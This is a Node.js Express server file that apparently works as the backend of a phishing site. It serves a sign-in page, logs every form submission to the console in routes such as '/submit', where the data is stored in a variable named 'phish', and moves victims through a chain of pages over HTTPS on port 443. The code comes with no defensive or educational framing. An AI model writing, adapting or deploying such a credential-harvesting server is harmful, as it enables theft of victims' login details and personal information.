const express = require('express');
const parser = require("body-parser");
const path = require('path');
const https = require('https');
const fs = require('fs');

const app = express();

// Load SSL certificate
const options = {
    key: fs.readFileSync('C:/GOON/Ville/server.key'), // Use forward slashes or escape backslashes
    cert: fs.readFileSync('C:/GOON/Ville/server.cert') // Use forward slashes or escape backslashes
};

app.use(express.json());
app.use(parser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get('/', (req, res) => {
    setTimeout(() => {
        res.redirect('/sign.html');
    }, 2000);
});

app.post('/hello', (req, res) => {

    const data = req.body;
    console.log(data);
    res.redirect("/av.html");
});

app.post('/submit', (req, res) => {
    const phish = req.body;
    console.log(phish);
    res.redirect("/success.html");
});

// Create HTTPS server
const server = https.createServer(options, app);

// Use port 443 for HTTPS or keep it as 92 for testing
server.listen(443, "0.0.0.0", () => {
    console.log('SERVER WALKING ....');
});